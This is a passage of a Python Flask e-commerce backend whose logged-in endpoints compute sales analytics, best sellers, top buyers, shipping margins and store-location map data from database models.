                 result[product.category] = {'sales' : item.amount, 'subtotal': round(item.price*item.amount,2), 'items':{}}
              subtotal += item.price*item.amount
              if item.product_name in result[product.category]['items']:
                 result[product.category]['items'][item.product_name]['amount'] += item.amount
                 result[product.category]['items'][item.product_name]['subtotal'] += item.amount * item.price
              else: 
                 result[product.category]['items'][item.product_name] = {'amount': item.amount, 'price' : item.price, 'subtotal': item.amount * item.price}

              result[product.category]['items'][item.product_name]['subtotal'] = round(result[item.category]['items'][item.product_name]['subtotal'],2)

      result['discount'] = round(subtotal - result['paid_subtotal'] ,2)
 
      r = Response(response=json.dumps(result), status=200, mimetype="application/json")
      r.headers["Content-Type"] = "text/json; charset = utf-8"
      return r


@app.route('/sales_analytics', methods=['POST'])
@login_required
def sales_analytics():
  if request.method == 'POST':
     year = request.json['year']
     if request.json['year'] == '':
        year = year_now()

     result = {'year': year,'total_sales' : 0, 'num_of_sales': 0, 'sales_per_day':[], 'sales_per_month':[], 'available_years': []}
     
     sales_database = Sales.query.order_by(Sales.sale_ID).filter_by(refunded = False).all()
     for sale in sales_database:
         year = sale.date.split(',')[1]
         if year not in result['available_years']:
            result['available_years'].append(year)


     if year == '':
        sales = Sales.query.order_by(Sales.sale_ID.asc()).filter_by(refunded = False).all()
     else:
        sales = Sales.query.order_by(Sales.sale_ID.asc()).filter_by(refunded = False).filter(Sales.date.contains(year)).all()

     step = 0
     month_step = 0
     for order in sales:
         result['total_sales'] += order.sale_amount
         result['total_sales'] = round(result['total_sales'],2)
         result['num_of_sales'] += 1
         if step == 0:
            result['sales_per_day'].append([order.date.split(',')[0], 1, round(order.sale_amount,2)])
            result['sales_per_month'].append([get_month_from_date(order.date), 1, round(order.sale_amount,2)])
            step+=1
            month_step +=1
         else:
            if result['sales_per_day'][step-1][0] == order.date.split(',')[0]:
               result['sales_per_day'][step-1][1] += 1
               result['sales_per_day'][step-1][2] += round(order.sale_amount,2)
            else:
               result['sales_per_day'].append([order.date.split(',')[0], 1, order.sale_amount ])
               step+=1

            if result['sales_per_month'][month_step-1][0] == get_month_from_date(order.date):
               result['sales_per_month'][month_step-1][1] += 1
               result['sales_per_month'][month_step-1][2] += order.sale_amount
               result['sales_per_month'][month_step-1][2] = round(result['sales_per_month'][month_step-1][2],2)
            else:
               result['sales_per_month'].append([get_month_from_date(order.date), 1, order.sale_amount])
               month_step+=1
     
     r = Response(response=json.dumps(result), status=200, mimetype="application/json")
     r.headers["Content-Type"] = "text/json; charset = utf-8"
     return r


@app.route('/best_sellers', methods=['POST'])
@login_required
def best_sellers():
  if request.method == 'POST':
     result = {}
     list_result = []
     sales = Sales.query.order_by(Sales.sale_ID).filter_by(refunded = False).all()
     for order in sales:
         items = Invoices.query.filter_by(sale_ID = order.sale_ID).all()
         for item in items:
             if item.product_name in result:
                result[item.product_name]['num_of_sales'] += item.amount
                result[item.product_name]['amount_of_sales'] += item.price * item.amount
                result[item.product_name]['amount_of_sales'] = round(result[item.product_name]['amount_of_sales'], 2)
             else:
                product = Products.query.filter_by(product_ID = item.product_ID).first()
                result[item.product_name] = {'num_of_sales': item.amount, 'amount_of_sales': item.price * item.amount, 'image': product.mainimage}

     
     for item in result:
         list_result.append([item, result[item]['num_of_sales'], result[item]['amount_of_sales'], result[item]['image']] )
     
     if request.json['type'] == 'num_of_sales':
        list_result = sorted(list_result, key=lambda e: e[1], reverse = True)
     else:
        list_result = sorted(list_result, key=lambda e: e[2], reverse = True)
     result = {'list_result' : list_result}
     
     r = Response(response=json.dumps(result), status=200, mimetype="application/json")
     r.headers["Content-Type"] = "text/json; charset = utf-8"
     return r

@app.route('/best_selling_brands', methods=['POST'])
@login_required
def best_selling_brands():
  if request.method == 'POST':
     result = {}
     list_result = []
     sales = Sales.query.order_by(Sales.sale_ID).filter_by(refunded = False).all()
     for order in sales:
         items = Invoices.query.filter_by(sale_ID = order.sale_ID).all()
         for item in items:
             if item.category in result:
                result[item.category]['num_of_sales'] += item.amount
                result[item.category]['amount_of_sales'] += item.price * item.amount
                result[item.category]['amount_of_sales'] = round(result[item.category]['amount_of_sales'], 2)
             else:
                result[item.category] = {'num_of_sales': item.amount, 'amount_of_sales': item.price * item.amount}

     
     for item in result:
         list_result.append([item, result[item]['num_of_sales'], result[item]['amount_of_sales']])
     
     if request.json['type'] == 'num_of_sales':
        list_result = sorted(list_result, key=lambda e: e[1], reverse = True)
     else:
        list_result = sorted(list_result, key=lambda e: e[2], reverse = True)
     result = {'list_result' : list_result}
     
     r = Response(response=json.dumps(result), status=200, mimetype="application/json")
     r.headers["Content-Type"] = "text/json; charset = utf-8"
     return r





@app.route('/change_currency', methods=['POST'])
@login_required
def change_currency():
  if request.method == 'POST':
     current_user.currency = request.json['currency']
     db.session.commit()
     result = {'message':200}
     r = Response(response=json.dumps(result), status=200, mimetype="application/json")
     r.headers["Content-Type"] = "text/json; charset = utf-8"
     return r



@app.route('/buyers', methods = ['POST'])
@login_required
def buyers():
  if request.method == 'POST':
     result={'average_revenue': 0, 'top_buyers' : {}, 'top_buyers_amount': {}, 'average_wait_time': {}}
     list_buyers = []
     list_buyers_amount = []
     list_wait_time = []
     users = User.query.order_by(User.userID).all()
     for user in users:
         sales = Sales.query.order_by(Sales.sale_ID).filter_by(user_ID = user.userID, refunded = False).all()
         for sale in sales:

             if user.userID in result['top_buyers']:
                result['top_buyers'][user.userID]['num_of_sales'] += 1                
             else:
                result['top_buyers'][user.userID] = {'name': user.firstname + ' ' + user.lastname, 'email': user.email, 'num_of_sales': 1}
                            
             if user.userID in result['top_buyers_amount']:
                result['top_buyers_amount'][user.userID]['amount_of_sales'] += sale.sale_amount
                result['top_buyers_amount'][user.userID]['amount_of_sales']  = round(result['top_buyers_amount'][user.userID]['amount_of_sales'],2)
             else:
                result['top_buyers_amount'][user.userID] = {'name': user.firstname + ' ' + user.lastname, 'email': user.email, 'amount_of_sales': sale.sale_amount}

             if user.userID in result['average_wait_time']:
                result['average_wait_time'][user.userID]['time_gap'] += calc_days_gap(result['average_wait_time'][user.userID]['start_date'], sale.date)
                result['average_wait_time'][user.userID]['start_date'] = sale.date
             else:
                result['average_wait_time'][user.userID] = {'name': user.firstname + ' '+ user.lastname, 'email': user.email, 'start_date': sale.date , 'time_gap': 0 }


     total_sales = 0
     for buyer in result['top_buyers_amount']:
         total_sales += result['top_buyers_amount'][buyer]['amount_of_sales']
         list_buyers_amount.append([buyer, result['top_buyers_amount'][buyer]['email'], result['top_buyers_amount'][buyer]['amount_of_sales']])
     
     result['average_revenue'] = round(total_sales/len(list_buyers_amount),2)

     for buyer in result['average_wait_time']:
       if result['top_buyers'][buyer]['num_of_sales'] > 1:
         result['average_wait_time'][buyer]['time_gap'] = round(result['average_wait_time'][buyer]['time_gap']/(result['top_buyers'][buyer]['num_of_sales']-1))
         list_wait_time.append([buyer, result['average_wait_time'][buyer]['email'], result['average_wait_time'][buyer]['time_gap']])


     for buyer in result['top_buyers']:
         list_buyers.append([buyer, result['top_buyers'][buyer]['email'], result['top_buyers'][buyer]['num_of_sales'] ])

     list_buyers = sorted(list_buyers, key=lambda e: e[2], reverse = True)
     list_wait_time = sorted(list_wait_time, key=lambda e: e[2])
     list_buyers_amount = sorted(list_buyers_amount, key=lambda e: e[2], reverse = True)

     
     result['top_buyers'] = list_buyers[:20]
     result['average_wait_time'] = list_wait_time[:20]
     result['top_buyers_amount'] = list_buyers_amount[:20]
    
     r = Response(response=json.dumps(result), status=200, mimetype="application/json")
     r.headers["Content-Type"] = "text/json; charset = utf-8"
     return r


@app.route('/locations', methods = ['POST'])
def locations():
    if request.method == 'POST':
       result = {'stores':[]}
       stores = Stores.query.order_by(Stores.store_id).all()
       for store in stores:
           location_string = '<div class="infobox"><h3 class="title"><a href="'+store.map_url + '">'+store.store_name+'</a></h3><span>'+store.address+ ', '+store.city+ ', '+ store.province + ', '+ store.country + '</span>' 
           location_string += '<br/> <h3 class="title">Contact: </h3>'+store.contact_name + ' (' + store.contact_number + ') </div>'
           result['stores'].append([location_string, float(store.latitude), float(store.longitude), 5, store.icon_url])
       
       r = Response(response=json.dumps(result), status=200, mimetype="application/json")
       r.headers["Content-Type"] = "text/json; charset = utf-8"
       return r


@app.route('/shipping', methods = ['POST'])
@login_required
def shipping():
  if request.method == 'POST':
     result={'total_charge': 0, 'total_cost': 0,  'shipping_diff' : {}, 'shipping_diff_country':{}, 'shipping_diff_province': {}}
     sales = Sales.query.order_by(Sales.sale_ID).filter_by(refunded = False).all()
     for sale in sales:   
         result['total_charge'] += sale.shipping_charge
         result['total_cost'] += sale.shipping_cost    
         result['shipping_diff'][sale.sale_ID] = round(sale.shipping_charge  - sale.shipping_cost, 2)
         location = User.query.filter_by(userID = sale.user_ID).first()
         if location.country in result['shipping_diff_country']:
            result['shipping_diff_country'][location.country]['difference'] += sale.shipping_charge - sale.shipping_cost
            result['shipping_diff_country'][location.country]['difference'] = round(result['shipping_diff_country'][location.country]['difference'] ,2)
            result['shipping_diff_country'][location.country]['num_of_orders'] += 1
         else:
            result['shipping_diff_country'][location.country] = {'difference': sale.shipping_charge - sale.shipping_cost, 'num_of_orders' : 1}
            result['shipping_diff_country'][location.country]['difference'] = round(result['shipping_diff_country'][location.country]['difference'] ,2)

         if location.country in result['shipping_diff_province']:
            if location.province in result['shipping_diff_province'][location.country]:
               result['shipping_diff_province'][location.country][location.province]['difference'] += sale.shipping_charge - sale.shipping_cost
               result['shipping_diff_province'][location.country][location.province]['difference'] = round(result['shipping_diff_province'][location.country][location.province]['difference'],2)
               result['shipping_diff_province'][location.country][location.province]['num_of_orders'] += 1
            else:
               result['shipping_diff_province'][location.country][location.province] = {'difference':sale.shipping_charge - sale.shipping_cost, 'num_of_orders': 1}
               result['shipping_diff_province'][location.country][location.province]['difference'] = round(result['shipping_diff_province'][location.country][location.province]['difference'],2)
         else:
            result['shipping_diff_province'][location.country] = {}
            result['shipping_diff_province'][location.country][location.province] = {'difference': sale.shipping_charge - sale.shipping_cost, 'num_of_orders' : 1}
            result['shipping_diff_province'][location.country][location.province]['difference'] = round(result['shipping_diff_province'][location.country][location.province]['difference'],2)

     result['total_charge'] = round(result['total_charge'], 2)
     result['total_cost'] = round(result['total_cost'], 2)

     r = Response(response=json.dumps(result), status=200, mimetype="application/json")
     r.headers["Content-Type"] = "text/json; charset = utf-8"
     return r